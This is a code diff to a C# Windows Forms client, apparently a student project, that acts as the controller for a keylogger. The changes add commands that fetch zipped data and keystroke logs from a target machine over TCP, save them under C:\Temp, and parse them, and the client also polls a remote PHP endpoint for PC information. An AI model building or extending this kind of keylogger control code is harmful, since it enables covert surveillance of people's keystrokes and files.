@@ -11,12 +11,13 @@ using IdpaTools;
 using System.Net;
 using System.Net.Sockets;
 using System.IO;
+using System.Threading;
 
 namespace IdpaClient
 {
     public partial class Form1 : Form
     {
-        private const string LOG_PATH = @"C:\Temp\log.xml";
+        private const string LOG_PATH = @"C:\Temp\log_send.xml";
         private const string URI_GET_PCINFO = @"http://www.swordbreacker.ch/idpa/getdata.php";
         private Logger logger;
         private AutoCompleteStringCollection textSource = new AutoCompleteStringCollection();
@@ -41,6 +42,9 @@ namespace IdpaClient
         
         private void GetKeyLoggerData()
         {
+            if (!File.Exists(LOG_PATH))
+                return;
+
             logger = Serilizer.getDataFromFile(LOG_PATH, logger);
 
             foreach (ApplicationLog app in logger.applicationLog)
@@ -82,12 +86,29 @@ namespace IdpaClient
         private void getData_Click(object sender, EventArgs e)
         {
             print("Starting download...");
-            ConnectionManager.SendCommand("127.0.0.1", "ping");
-            eventLog.AppendText("Ping: " + Program.stopwatch.Elapsed.Milliseconds + "\r\n");
-            Program.stopwatch.Reset();
+            adressInfo.Stop();
+            if (ConnectionManager.SendCommand("127.0.0.1", "getdata"))
+            {
+                Task.Factory.StartNew(() => ConnectionManager.startAsyncTCPListener(2));
+            }
+            else print("Target not available");
+            adressInfo.Start();
         }
 
         private void adressInfo_Tick(object sender, EventArgs e)
+        {
+            Task t = new Task(() => getPcInformations());
+            t.Start(TaskScheduler.FromCurrentSynchronizationContext());
+            pingServer();
+        }
+
+        private async void pingServer()
+        {
+            double ping = await ConnectionManager.Ping("127.0.0.1");
+            pcPingData.Text = ping.ToString();
+        }
+
+        private void getPcInformations()
         {
             string xml = ConnectionManager.getPcInformations(URI_GET_PCINFO);
 
@@ -139,11 +160,6 @@ namespace IdpaClient
         {
             if (e.KeyData == Keys.Return)
                 Search();
-        }
-
-        private void adressinformation_SelectedIndexChanged(object sender, EventArgs e)
-        {
-            
         }
 
         private void Search()
@@ -391,10 +407,32 @@ namespace IdpaClient
             searchBox.AutoCompleteCustomSource = dateSource;
         }
 
-        private void print(string msg)
+        public void print(string msg)
         {
             eventLog.AppendText(msg + "\r\n");
         }
+
+        public static void storeData(byte[] data)
+        {
+            FileManager.SaveZipFile(data, @"C:\Temp\zipTest.zip");
+        }
+
+        public static void storeLogFile(byte[] data)
+        {
+            FileManager.SaveLogFile(data, @"C:\Temp\log_send.xml");
+        }
+
+        private async void refreshLogFile_Click(object sender, EventArgs e)
+        {
+            adressInfo.Stop();
+            if(ConnectionManager.SendCommand("127.0.0.1", "getlogfile"))
+            {
+                await Task.Factory.StartNew(() => ConnectionManager.startAsyncTCPListener(1));
+                GetKeyLoggerData();
+            }
+            adressInfo.Start();
+        }
+
 
         //public static int BinSearch(ref int[] x, int searchValue)
         //{
